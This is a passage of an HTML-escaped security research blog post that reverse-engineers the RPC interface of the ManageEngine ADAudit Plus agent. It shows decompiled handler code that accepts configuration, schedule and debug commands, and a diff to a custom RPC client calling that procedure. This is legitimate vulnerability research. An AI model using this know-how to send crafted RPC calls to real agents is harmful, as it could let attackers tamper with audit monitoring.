&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; Get-Content &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\MessengerLog_2023_12_01.txt&amp;#39;&lt;/span&gt; -Tail &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;663&lt;/span&gt;] [&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;][&lt;span style=&#34;color:#66d9ef&#34;&gt;INFO ][Messenger&lt;/span&gt;] &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; Change Notification from ADAP Server, ID &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So now we know that we trigger some kind of &lt;em&gt;Change Notification&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;We also know from the &lt;code&gt;RpcView.exe&lt;/code&gt; output that the RPC named pipe is
exposed via a binary called &lt;code&gt;ADAPAgent.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;By running the following PowerShell command we determine that the binary
is a .NET assembly:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;System.Reflection.AssemblyName&lt;/span&gt;]::GetAssemblyName(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\bin\ADAPAgent.exe&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Version        Name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-------        ----
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6.0&lt;/span&gt;.0.0        ADAPAgent
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we are &lt;em&gt;riding on a shrimp sandwitch&lt;/em&gt; (thanks for the &lt;a href=&#34;https://youtu.be/lt48y6WP7qA?feature=shared&amp;amp;t=7515&#34;&gt;Swedish translation&lt;/a&gt; @fransrosen :) ). .NET assemblies can much like Jar-files
be decompiled into human readable code.
This means that we won&amp;rsquo;t need to dig into low-level language such as
assembly, pseudo code or similar.&lt;/p&gt;
&lt;p&gt;After downloading and extracting &lt;a href=&#34;https://github.com/dnSpy/dnSpy&#34;&gt;dnSpy&lt;/a&gt; we open
&lt;code&gt;ADAPAgent.exe&lt;/code&gt; and start our investigation.&lt;/p&gt;
&lt;p&gt;Quite quickly we notice the &lt;code&gt;RPCHandler&lt;/code&gt; class with the &lt;code&gt;NotifyAgent&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dnspy-decompiling-adauditagent.png&#34; alt=&#34;dnspy-decompiling-adauditagent&#34;&gt;&lt;/p&gt;
&lt;p&gt;Comparing this disassembled function from &lt;code&gt;ADAPAgent.exe&lt;/code&gt; with our IDL
structure, we can assume the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;parameter-guessing.png&#34; alt=&#34;parameter-guessing&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dnspy-decompiling-adauditagent-with-comments.png&#34; alt=&#34;idl-structure-in-visualstudio&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Guess a lot&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As seen in the code from the &lt;code&gt;NotifyAgent&lt;/code&gt; function it was quite
boring:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; NotifyAgent(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; notifyId)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Logger.Msgr.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Change Notification from ADAP Server, ID : {0}&amp;#34;&lt;/span&gt;, notifyId);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It only logs the parameter &lt;code&gt;notifyId&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Looking into the next function however, &lt;code&gt;NofifyAgentStr&lt;/code&gt; contains alot
more interesting functionality:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Agent.RPC.RPCHandler&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Token: 0x06000129 RID: 297 RVA: 0x00008D04 File Offset: 0x00006F04&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; NotifyAgentStr(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; notifyId, &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; msgStr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; errStatus = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (msgMap.ContainsKey(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;) &amp;amp;&amp;amp; DataStore.Get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;).ToString().Equals(msgMap[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;].ToString()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			errStatus = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			JObject json = JObject.Parse(msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			json.Remove(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AgentUID&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			json.Remove(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ADAP_SERVER_DNS_NAME&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; jsonMsgStr = JsonAPI.ObjectToJsonString(json);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (notifyId)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				DataStore.Update(jsonMsgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (!ExcludeConfManager.getInstance.UpdateConf(jsonMsgStr))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					Logger.Config.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exclude configuration updation failed \n{0}&amp;#34;&lt;/span&gt;, msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; flag = ScheduleManager.updateSceduleConf(jsonMsgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				RPCHandler.isScheduleXmlUpdated = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					RPCHandler.isScheduleXmlUpdated = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				Logger.Config.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Schedule configuration updation failed \n{0} &amp;#34;&lt;/span&gt;, msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (!EventParserManager.getInstance.UpdateConf(jsonMsgStr))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					Logger.Config.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Parser configuration updation failed \n{0} &amp;#34;&lt;/span&gt;, msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				Logger.Config.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Protocol Configuration is (From ADAP server) : \n{0}&amp;#34;&lt;/span&gt;, msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				DataStore.Update(jsonMsgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Thread(&lt;span style=&#34;color:#66d9ef&#34;&gt;delegate&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					DataStore.SendTestPacket();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}).Start();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				Logger.Config.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test pockets send to ADAP server thread started&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; enableDebug = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (msgMap.ContainsKey(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ENABLE_DEBUG&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					enableDebug = (&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;)msgMap[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ENABLE_DEBUG&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				Logger.enableDisableDebugLevel(enableDebug);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				DataStore.Update(jsonMsgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				Logger.Event.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Request from ADAP server to run schedule immediately&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Scheduler().runEventScheduler();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				JArray shareArray = json[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SHARES&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; JArray;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Thread(&lt;span style=&#34;color:#66d9ef&#34;&gt;delegate&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					ShareFinalPathName.getFinalPathName(shareArray);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}).Start();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; IL_24F;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			Logger.Msgr.ErrorFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NotifyAgentStr :: Invalid notification Id : \n{0}&amp;#34;&lt;/span&gt;, notifyId);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			Logger.Msgr.ErrorFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;synced from unknown server : ServerName :: {0}&amp;#34;&lt;/span&gt;, msgMap[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ADAP_SERVER_DNS_NAME&amp;#34;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		IL_24F:;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception ex)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		Logger.Msgr.ErrorFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;EXCEPTION :: RPCHandler.NotifyAgentStr : {0}&amp;#34;&lt;/span&gt;, ex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		errStatus = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; errStatus;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets see if the &lt;code&gt;private static int NotifyAgentStr(int notifyId, string msgStr)&lt;/code&gt;
maps to either &lt;code&gt;Proc1&lt;/code&gt; or &lt;code&gt;Proc2&lt;/code&gt; in our IDL:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;idl-structure-in-visualstudio.png&#34; alt=&#34;idl-structure-in-visualstudio&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Proc1&lt;/code&gt; requires a long (integer) as arg_0. Check&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Proc1&lt;/code&gt; requires a wchar_t (string) as arg_1. Check&lt;/p&gt;
&lt;p&gt;Oh yes. &lt;code&gt;Proc1&lt;/code&gt; is likely mapped to the &lt;code&gt;NotifyAgentStr&lt;/code&gt; function in &lt;code&gt;ADAP.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Lets update the custom &lt;code&gt;adauditrpc-client&lt;/code&gt; created in part 1:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-    long arg_0 = 0;
-    long arg1_pointer;
-    long* arg_1 = &amp;amp;arg1_pointer;
-    RpcTryExcept
-    {
-        Proc0(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1);
-    }

+    long arg_0 = 0;
+    wchar_t arg_1[] = L&amp;#34;snus&amp;#34;;
+    long arg2_pointer;
+    long* arg_2 = &amp;amp;arg2_pointer;
+    RpcTryExcept
+    {
+        Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1, arg_2);
+    }
